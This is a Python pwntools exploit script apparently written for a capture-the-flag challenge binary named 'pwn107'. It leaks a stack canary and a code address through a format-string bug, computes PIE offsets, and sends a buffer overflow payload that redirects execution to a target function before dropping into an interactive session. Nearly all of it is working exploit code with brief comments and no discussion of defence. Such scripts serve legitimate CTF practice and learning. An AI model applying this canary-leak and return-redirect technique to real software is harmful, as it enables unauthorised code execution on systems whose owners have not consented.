from pwn import * 

e= ELF('./pwn107')
context.binary = './pwn107'

DEBUG = 0
if DEBUG == 0:
    p = process("./pwn107")
else : 
    p = remote("", 9007)    

# used to get the i where we get a good leak (here it was %17$p)
# NOTTEE !! on remote server it was %19$p for some reason
# and %13$p contains the canary value
def leak_addresses(max_i=40):
    for i in range(1, max_i):
        p = process('./pwn107')
        p.recvuntil(b"THM: What's your last streak?")
        payload = f"%{i}$p".encode()
        p.sendline(payload)
        p.recvuntil(b"Your current streak:")
        leak = p.recvline().strip().decode()
        if leak != "(nil)":
            print(f"Leaked address %{i}$p : {leak}")
        p.close()

p.recvuntil(b"THM: What's your last streak?")
p.sendline(b"%19$p %13$p")
p.recvuntil(b"Your current streak:")
leak_line = p.recvline().strip().decode()

leaks = leak_line.split()
main_addr = int(leaks[0], 16)
canary = int(leaks[1], 16)

offset = 0x992 - 0x94c
print(f"offset for get_streak : {hex(offset)}")
get_streak_addr = main_addr - offset
offset = 0x992 - 0x6fe
print(f"offset for ret : {hex(offset)}")
ret_gadget = main_addr - offset
print(f"main_addr : {main_addr}")
print(f"get_streak_addr : {hex(get_streak_addr)}")
print(f"canary : {hex(canary)}")
print(f"ret_gadget : {hex(ret_gadget)}")

payload = b'a' * 24
payload += p64(canary)
payload += b'b' * 8 # saved rbp
payload += p64(ret_gadget)
payload += p64(get_streak_addr)
p.recvuntil(b"We miss you!")
p.sendline(payload)

p.interactive()

